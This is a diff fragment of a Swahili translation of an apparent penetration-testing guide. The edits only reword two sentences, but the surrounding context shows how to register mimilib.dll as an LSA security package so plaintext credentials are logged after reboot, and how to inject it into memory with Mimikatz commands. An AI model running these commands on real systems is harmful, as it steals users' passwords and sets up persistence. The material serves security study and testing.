@@ -22,11 +22,11 @@ Ongeza `mimilib.dll` kwenye orodha ya Watoa Huduma za Usalama (Security Packages
 ```powershell
 reg add "hklm\system\currentcontrolset\control\lsa\" /v "Security Packages"
 ```
-Na baada ya kuanzisha upya, akreditivu zote zinaweza kupatikana kwa maandiko wazi katika `C:\Windows\System32\kiwissp.log`
+Na baada ya kuanzisha upya, sifa zote zinaweza kupatikana kwa maandiko wazi katika `C:\Windows\System32\kiwissp.log`
 
 #### Katika kumbukumbu
 
-Unaweza pia kuingiza hii moja kwa moja katika kumbukumbu ukitumia Mimikatz (zingatia kwamba inaweza kuwa na utata kidogo/isiweze kufanya kazi):
+Unaweza pia kuingiza hii moja kwa moja katika kumbukumbu ukitumia Mimikatz (zingatia kwamba inaweza kuwa na kutokuwa thabiti/kutofanya kazi):
 ```powershell
 privilege::debug
 misc::memssp
